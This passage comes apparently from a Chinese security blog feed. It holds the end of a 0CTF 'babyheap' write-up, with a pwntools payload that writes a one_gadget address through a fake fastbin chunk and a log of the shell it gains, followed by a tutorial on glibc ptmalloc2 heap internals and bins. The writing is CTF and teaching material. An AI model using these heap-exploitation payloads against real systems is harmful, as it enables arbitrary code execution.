<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">code:</span><br><span class="line">malloc(0x60)</span><br><span class="line">malloc(0x60) # malloc fake chunk</span><br><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x9c3ea50420000000</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x55c4480920f0 —▸ 0x7f9c3ed6db58 (main_arena+88) ◂— 0x55c4480920f0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<p>最后我们构造fake chunk，写入one_gadget即可，这里根据自己的libc版本查询相应的one_gadget</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># construct fake chunk</span><br><span class="line">payload = p8(0)*3</span><br><span class="line">payload += p64(0)*2</span><br><span class="line">payload += p64(libc_base+0x3f35a) # one_gadgets</span><br><span class="line">fill(6, payload)</span><br><span class="line"></span><br><span class="line"># trigger</span><br><span class="line">malloc(255)</span><br></pre></td></tr></table></figure>
<p>最后getshell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ls</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;ls\n&apos;</span><br><span class="line">[DEBUG] Received 0x2f bytes:</span><br><span class="line">    &apos;0ctfbabyheap  core  exp.py  libc.so.6\n&apos;</span><br><span class="line">0ctfbabyheap  core  exp.py  libc.so.6</span><br><span class="line">$ whoami</span><br><span class="line">[DEBUG] Sent 0x7 bytes:</span><br><span class="line">    &apos;whoami\n&apos;</span><br><span class="line">[DEBUG] Received 0x8 bytes:</span><br><span class="line">    &apos;thunder\n&apos;</span><br><span class="line">thunder</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这道题目因为可以自己构造堆的结构，所以比较自由，利用的方法也非常多，我的exp是针对我的deepin环境，想要在不同平台进行利用，需要查看自己libc中的偏移，修改部分偏移即可</p>
<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ol>
<li>保护全开可以覆写malloc_hook，free_hook等函数</li>
<li>small chunk泄露fd和bk，从而泄露libc的手法</li>
<li>堆溢出的前提下对fast bin检查机制的一些绕过手法</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
        <category>题目篇</category>
        <category>PWN</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>Heap over flow</tag>
      </tags>
  </entry>
  <entry>
    <title>glibc heap</title>
    <url>/2019/09/08/glibc-heap/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>本文实验环境主要是在Linux下，对Linux的堆知识进行整理和总结，也算是对许多资料的一个整理，和Windows相比，Linux下的堆管理机制并没有那么的严谨，导致了许多攻击的产生，下面就从概念开始分析Linux堆管理机制</p>
<h2 id="0x01-堆定义"><a href="#0x01-堆定义" class="headerlink" title="0x01 堆定义"></a>0x01 堆定义</h2><p>在程序运行过程中，堆可以提供动态分配的内存，允许程序申请大小未知的内存。堆其实就是程序虚拟地址空间的一块连续的线性区域。我们一般称管理堆的那部分程序为堆管理器，与栈不同的是堆由<strong>低地址向高地址方向增长</strong>，而栈由低地址向高地址方向增长。下面这张图可以很清楚的说明：</p>
<p><img src="/2019/09/08/glibc-heap/1.png" alt="1"></p>
<p>注:本文提到的堆是基于<strong>glibc 库下的 ptmalloc2堆管理器</strong></p>
<h2 id="0x02-堆相关数据结构"><a href="#0x02-堆相关数据结构" class="headerlink" title="0x02 堆相关数据结构"></a>0x02 堆相关数据结构</h2><h3 id="2-1-malloc-chunk"><a href="#2-1-malloc-chunk" class="headerlink" title="2.1 malloc_chunk"></a>2.1 malloc_chunk</h3><p>我们首先来看堆结构的源码，这里我们申请的每一个堆即是一个chunk结构，它有个名字叫做<code>malloc_chunk</code>，非常有意思的是，<strong>无论一个 chunk 的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a "view" into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>各个字段解释如下</p>
<ul>
<li><p><strong>prev_size</strong></p>
<p>负责记录前一块chunk的大小，<strong>只有在前面一个堆块是空闲的时候才有值</strong>。前面一个堆块在使用时，他的值始终为 0</p>
</li>
<li><p><strong>size</strong></p>
<p>记录该 chunk 的大小，大小必须是 2 <em> SIZE_SZ 的整数倍。如果申请的内存大小不是 2 </em> SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位有如下的作用</p>
<ul>
<li>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</li>
<li>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</li>
<li>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</li>
</ul>
</li>
<li><p><strong>fd，bk</strong></p>
<p>chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下</p>
<ul>
<li>fd 指向下一个（非物理相邻）空闲的 chunk</li>
<li>bk 指向上一个（非物理相邻）空闲的 chunk</li>
<li>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</li>
</ul>
</li>
<li><p><strong>fd_nextsize， bk_nextsize</strong></p>
<p>也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。</p>
<ul>
<li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
<li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
<li>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。<strong>这样做可以避免在寻找合适 chunk 时挨个遍历。</strong></li>
</ul>
</li>
</ul>
<h3 id="2-2-Allocated-chunk"><a href="#2-2-Allocated-chunk" class="headerlink" title="2.2 Allocated chunk"></a>2.2 Allocated chunk</h3><p>一个已经分配的chunk以及后一块chunk状态如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             (malloc_usable_size() bytes)                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             (size of chunk, but used for application data)    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
<h3 id="2-3-Freed-chunk"><a href="#2-3-Freed-chunk" class="headerlink" title="2.3 Freed chunk"></a>2.3 Freed chunk</h3><p>被释放的 chunk 被记录在链表中，可能是循环双向链表，也可能是单向链表，状态如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`head:&apos; |             Size of chunk, in bytes                     |A|0|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Forward pointer to next chunk in list             |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Back pointer to previous chunk in list            |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Unused space (may be 0 bytes long)                .</span><br><span class="line">        .                                                               .</span><br><span class="line"> next   .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`foot:&apos; |             Size of chunk, in bytes                           |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|0|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
<h3 id="2-4-malloc大小计算"><a href="#2-4-malloc大小计算" class="headerlink" title="2.4 malloc大小计算"></a>2.4 malloc大小计算</h3><p>对于正在使用的 chunk，它的下一个 chunk 的 prev_size 是无效的，这块内存也可以被当前 chunk 使用，这也就存在了空间的复用，因此对于使用中的 chunk 大小计算公式是：<code>chunk_size = （用户请求大小 + (2 -1) * sizeof(INTERNAL_SIZE_T)) aligh to 2 * sizeof(size_t)</code></p>
<p>比如我们在64位系统中 </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">8</span>)</span><br><span class="line"><span class="comment">// 申请到的chunk: 16 + 8 + 8 + 1 = 0x21</span></span><br></pre></td></tr></table></figure>
<ol>
<li>第一个 16 字节是<strong>系统最小分配的内存</strong>，也就是说你如果想要申请的内存小于系统最小分配的内存的话，就会按照最小的内存来分配，在 64 位系统中这个值是 16 个字节，在 32 位系统中是 8 个字节，如果代码中是 malloc(0) 的话，<strong>堆管理器也会分配最小内存空间给你</strong></li>
<li>第二个 8 字节是 pre size 字段的大小（32 位的为 4 字节）</li>
<li>第三个 8 字节为 size 字段的大小（32 位的为 4 字节）</li>
<li>最后一个 1 字节是 <strong>PREV_INUSE </strong>的值，只有 0 或 1两个值</li>
</ol>
<h3 id="2-5-lab"><a href="#2-5-lab" class="headerlink" title="2.5 lab"></a>2.5 lab</h3><p>为了搞清楚堆的结构我们首先做一个实验，构造如下代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	    <span class="keyword">char</span> *p;</span><br><span class="line">	    p = <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">		<span class="built_in">memcpy</span>(p,<span class="string">"aaaaa"</span>,<span class="number">5</span>);</span><br><span class="line">		<span class="built_in">free</span>(p);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序先用malloc函数申请了一块内存，然后向内存中拷贝了5个a，最后释放了这块内存，我们在gdb中观察堆的结构，我们首先运行到malloc函数，用vmmap观察内存布局，这里没有生成堆</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x555555554000     0x555555555000 r-xp     1000 0      /home/thunder/Desktop/codes/ctf/pwn/heap/heap1</span><br><span class="line">    0x555555754000     0x555555755000 r--p     1000 0      /home/thunder/Desktop/codes/ctf/pwn/heap/heap1</span><br><span class="line">    0x555555755000     0x555555756000 rw-p     1000 1000   /home/thunder/Desktop/codes/ctf/pwn/heap/heap1</span><br><span class="line">    0x7ffff7a3a000     0x7ffff7bcf000 r-xp   195000 0      /usr/lib/x86_64-linux-gnu/libc-2.24.so</span><br><span class="line">    0x7ffff7bcf000     0x7ffff7dcf000 ---p   200000 195000 /usr/lib/x86_64-linux-gnu/libc-2.24.so</span><br><span class="line">    0x7ffff7dcf000     0x7ffff7dd3000 r--p     4000 195000 /usr/lib/x86_64-linux-gnu/libc-2.24.so</span><br><span class="line">    0x7ffff7dd3000     0x7ffff7dd5000 rw-p     2000 199000 /usr/lib/x86_64-linux-gnu/libc-2.24.so</span><br><span class="line">    0x7ffff7dd5000     0x7ffff7dd9000 rw-p     4000 0      </span><br><span class="line">    0x7ffff7dd9000     0x7ffff7dfc000 r-xp    23000 0      /usr/lib/x86_64-linux-gnu/ld-2.24.so</span><br><span class="line">    0x7ffff7fd6000     0x7ffff7fd8000 rw-p     2000 0      </span><br><span class="line">    0x7ffff7ff4000     0x7ffff7ff7000 rw-p     3000 0      </span><br><span class="line">    0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 23000  /usr/lib/x86_64-linux-gnu/ld-2.24.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 24000  /usr/lib/x86_64-linux-gnu/ld-2.24.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      </span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]</span><br></pre></td></tr></table></figure>
<p>我们单步一下，观察malloc函数之后的返回值，即rax中保存的值，也就是指向我们chunk的地址，需要注意的是这里<strong>malloc函数返回的指针指向的是我们chunk中的user data(用户数据区)</strong>，我们继续用vmmap观察内存布局，此时已经可以看到我们申请的heap区，然而系统却给了我们大小<code>0x555555777000 - 0x555555756000 = 21000‬</code>的空间，这并不是系统在浪费资源，这是一种提高效率的做法，在下一次我们申请内存的时候就从这块内存里直接取，当这一块内存不足的时候才会向系统索取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x555555554000     0x555555555000 r-xp     1000 0      /home/thunder/Desktop/codes/ctf/pwn/heap/heap1</span><br><span class="line">    0x555555754000     0x555555755000 r--p     1000 0      /home/thunder/Desktop/codes/ctf/pwn/heap/heap1</span><br><span class="line">    0x555555755000     0x555555756000 rw-p     1000 1000   /home/thunder/Desktop/codes/ctf/pwn/heap/heap1</span><br><span class="line">    0x555555756000     0x555555777000 rw-p    21000 0      [heap] =&gt; 我们申请的chunk</span><br><span class="line">    0x7ffff7a3a000     0x7ffff7bcf000 r-xp   195000 0      /usr/lib/x86_64-linux-gnu/libc-2.24.so</span><br><span class="line">    0x7ffff7bcf000     0x7ffff7dcf000 ---p   200000 195000 /usr/lib/x86_64-linux-gnu/libc-2.24.so</span><br><span class="line">    0x7ffff7dcf000     0x7ffff7dd3000 r--p     4000 195000 /usr/lib/x86_64-linux-gnu/libc-2.24.so</span><br><span class="line">    0x7ffff7dd3000     0x7ffff7dd5000 rw-p     2000 199000 /usr/lib/x86_64-linux-gnu/libc-2.24.so</span><br><span class="line">    0x7ffff7dd5000     0x7ffff7dd9000 rw-p     4000 0      </span><br><span class="line">    0x7ffff7dd9000     0x7ffff7dfc000 r-xp    23000 0      /usr/lib/x86_64-linux-gnu/ld-2.24.so</span><br><span class="line">    0x7ffff7fd6000     0x7ffff7fd8000 rw-p     2000 0      </span><br><span class="line">    0x7ffff7ff4000     0x7ffff7ff7000 rw-p     3000 0      </span><br><span class="line">    0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 23000  /usr/lib/x86_64-linux-gnu/ld-2.24.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 24000  /usr/lib/x86_64-linux-gnu/ld-2.24.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      </span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]</span><br></pre></td></tr></table></figure>
<p>我们用<code>x/20gx rax</code>查看一下我们刚才申请堆的样子，<code>0x555555756000</code>和<code>0x555555756010</code>这两排既是我们申请的堆，size是<code>0x20 + 1 = 0x21</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x555555756010-32</span><br><span class="line">0x555555755ff0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x555555756010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756020:	0x0000000000000000	0x0000000000020fe1</span><br><span class="line">0x555555756030:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>我们继续运行程序到memcpy函数的下一行观察我们的堆，很明显我们将aaaaa写入了我们的user data中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x555555756010-32</span><br><span class="line">0x555555755ff0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x555555756010:	0x0000006161616161	0x0000000000000000</span><br><span class="line">0x555555756020:	0x0000000000000000	0x0000000000020fe1</span><br><span class="line">0x555555756030:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>我们继续运行将其释放掉，观察user data的区域已经被清空了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x555555756010-32</span><br><span class="line">0x555555755ff0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x555555756010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756020:	0x0000000000000000	0x0000000000020fe1</span><br><span class="line">0x555555756030:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>然而并不只是清空那么简单，系统还将把这块内存交给堆管理系统中去，方便下一次申请操作，这里我们用<code>x/10gx &amp;main_arena</code>命令发现我们的堆已经连到了main_arena + 0x8中，并且连接的是堆的头部</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/10gx &amp;main_arena</span><br><span class="line">0x7ffff7dd3b00 &lt;main_arena&gt;:	0x0000000000000000	0x0000555555756000</span><br><span class="line">0x7ffff7dd3b10 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dd3b20 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dd3b30 &lt;main_arena+48&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dd3b40 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>所以我们可以总结一下free函数</p>
<ul>
<li>清空user data的数据</li>
<li>将此chunk放入堆管理器中</li>
</ul>
<h3 id="2-6-main-arena"><a href="#2-6-main-arena" class="headerlink" title="2.6 main_arena"></a>2.6 main_arena</h3><p>main_arena 就是 ptmalloc2 堆管理器通过与操作系统内核进行交互申请到的，也就是我们一开始申请到的那么一大块内存，因为是主线程分配的，所以叫 main_arena </p>
<h3 id="2-7-Top-chunk"><a href="#2-7-Top-chunk" class="headerlink" title="2.7 Top chunk"></a>2.7 Top chunk</h3><p>如果你细心的话你可能会观察到，在刚才我们申请chunk的下面始终有 0x20fe1 大小的chunk，这一块chunk非常大，程序以后分配到的内存到要放在他的后面，它的作用就是在程序在向堆管理器申请内存时，没有合适的内存空间可以分配时，此时就会从 top chunk 上借一部分作为 chunk 分配给它</p>
<h3 id="2-8-Last-Remainder-Chunk"><a href="#2-8-Last-Remainder-Chunk" class="headerlink" title="2.8 Last Remainder Chunk"></a>2.8 Last Remainder Chunk</h3><p>这是最近一次 small chunk 请求而产生分割后剩下的那一块 chunk，当在 small bins 和 unsorted bin  中找不到合适的 chunk时，如果 last remainder chunk 的大小大于用户请求的大小，则将其分割，返回用户所需 chunk  后，剩下的成为新的 last remainder chunk。</p>
<h2 id="0x03-malloc-amp-free"><a href="#0x03-malloc-amp-free" class="headerlink" title="0x03 malloc &amp; free"></a>0x03 malloc &amp; free</h2><p>malloc根据用户申请堆块的大小不同做出不同的处理。最常用的是fastbin和chunk。malloc分配时的整体顺序是如果堆块较小，属于fastbin，则在fastbin  list里寻找到一个恰当大小的堆块；如果其大小属于normal chunk，则在normal  bins里面（unsort，small，large）寻找一个恰当的堆块。如果这些bins都为空或没有分配成功，则从top  chunk指向的区域分配堆块。</p>
<p><strong>bins</strong></p>
<p>libc的堆管理机制和其他的堆管理一样，对于free的堆块，堆管理器不会立即把释放的内存还给系统，而是自己保存起来，以便下次分配使用。这样可以减少和系统内核的交互次数，提高效率。Libc中保存释放的内存的地点就是bin。bin是一个个指针，指向一个个链表（双向&amp;单向），<strong>除了 fastbin 是 LIFO 单链表的数组维护，其余的bins都是 FIFO 双向链表维护</strong>，这些链表就由释放的内存组成，下面是bins的具体分类：</p>
<ul>
<li>Fast bin</li>
<li>Unsorted bin</li>
<li>Small bin</li>
<li>Large bin</li>
</ul>
<h3 id="3-1-Fast-bin"><a href="#3-1-Fast-bin" class="headerlink" title="3.1 Fast bin"></a>3.1 Fast bin</h3><p>特点：</p>
<ul>
<li>大小较小</li>
<li>单向链表维护</li>
<li>不会和其他的堆块融合(PREV_INUSE始终为1)</li>
<li>LIFO(类似栈)</li>
</ul>
<p>引用一张图片，fastbin一共有10个单项列表，下图是32位系统下的分布，当分配一块较小的内存(memory&lt;=64 Bytes)时，会首先检查对应大小的fastbin中是否包含未被使用的chunk，如果存在则直接将其从fastbin中移除并返回；否则通过其他方式（剪切top chunk）得到一块符合大小要求的chunk并返回。也就是说，fastbin list只用了前7个进行维护</p>
<p><img src="/2019/09/08/glibc-heap/2.png" alt="1567869962341"></p>
<p><strong>malloc (fast chunk)</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);  <span class="comment">// 找到nb 对应的 fastbin 的 索引 idx</span></span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);<span class="comment">// 找到对应的 fastbin 的指针</span></span><br><span class="line">      mchunkptr pp = *fb;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          victim = pp;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">             != victim);</span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="number">0</span>) <span class="comment">//如果 fastbin 非空，就进入这里</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))<span class="comment">// 判断大小是否满足 fastbin相应bin的大小要求</span></span><br><span class="line">            &#123;</span><br><span class="line">              errstr = <span class="string">"malloc(): memory corruption (fast)"</span>;</span><br><span class="line">            errout:</span><br><span class="line">              malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">              <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          check_remalloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>在初始化时 fast bin 支持的最大内存大小以及所有 fast bin 链表都是空的，所以即使用户申请了一个 fast  chunk，它也不会交由 fast bin 来处理，而是向下传递交由 small bin 来处理，如果 small bin 也为空的话就交给  unsorted bin 来处理。</p>
<p>那么 fast bin 是在哪？怎么进行初始化的呢？当我们第一次调用 malloc (fast chunk) 的时候，系统执行  _int_malloc 函数，该函数首先会发现当前 fast bin 为空，就转交给 small bin 处理，进而又发现 small bin  也为空，就调用 malloc_consolidate 函数对 malloc_state 结构体进行初始化， malloc_consolidate  函数主要完成以下几个功能：</p>
<ol>
<li>首先判断当前 malloc_state 结构体中的 fast bin 是否为空，如果为空就说明整个 malloc_state 都没有完成初始化，   需要对 malloc_state 进行初始化。</li>
<li>malloc_state 的初始化操作由函数 malloc_init_state(msate av) 完成，该函数先初始化除 fast bin 之外的所有 bins   （构建双链表），再初始化 fast bins。</li>
</ol>
<p>之后当 fast bin 中的相关数据不为空了，就开始使用 fast bin。</p>
<p>得到第一个来自于 fast bin 的 chunk 之后，系统就将该 chunk 从对应的 fast bin 中移除，并将其地址返回给用户。</p>
<p><strong>free (fast chunk)</strong></p>
<p>先通过 chunksize 函数根据传入的地址指针对应的 chunk 的大小，然后根据这个 chunk 的大小获取该 chunk 所属的 fast bin，然后再将此 chunk 添加到该 fast bin 的链尾。</p>
<p><img src="/2019/09/08/glibc-heap/3.png" alt="3"></p>
<h3 id="3-2-Unsorted-bin"><a href="#3-2-Unsorted-bin" class="headerlink" title="3.2 Unsorted bin"></a>3.2 Unsorted bin</h3><p>除了fastbin以外，堆块释放后堆块会被放到malloc_state结构的bins数组中，分布如下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Bin[0] -&gt; 不存在</span><br><span class="line">Bin[1] –&gt; Unsorted bin</span><br><span class="line">Bin[2] to Bin[63] –&gt; Small bin</span><br><span class="line">Bin[64] to Bin[126] –&gt; Large bin</span><br></pre></td></tr></table></figure>
<p>特点：</p>
<ul>
<li>大小不一</li>
<li>双向链表维护</li>
<li>FIFO</li>
</ul>
<p>当 fast bin、small bin 中的 chunk 都不能满足用户请求 chunk 大小时，堆管理器就会考虑使用 Unsorted bin 。它会在分配 large chunk 之前对堆中碎片 chunk 进行合并，以便减少堆中的碎片。Unsoted bin 是一个由 free chunks 组成的循环双向链表。在 Unsorted bin 中，对 chunk 的大小没有限制，任何大小的 chunk 都可以归属到 Unsorted bin 中。</p>
<p>malloc</p>
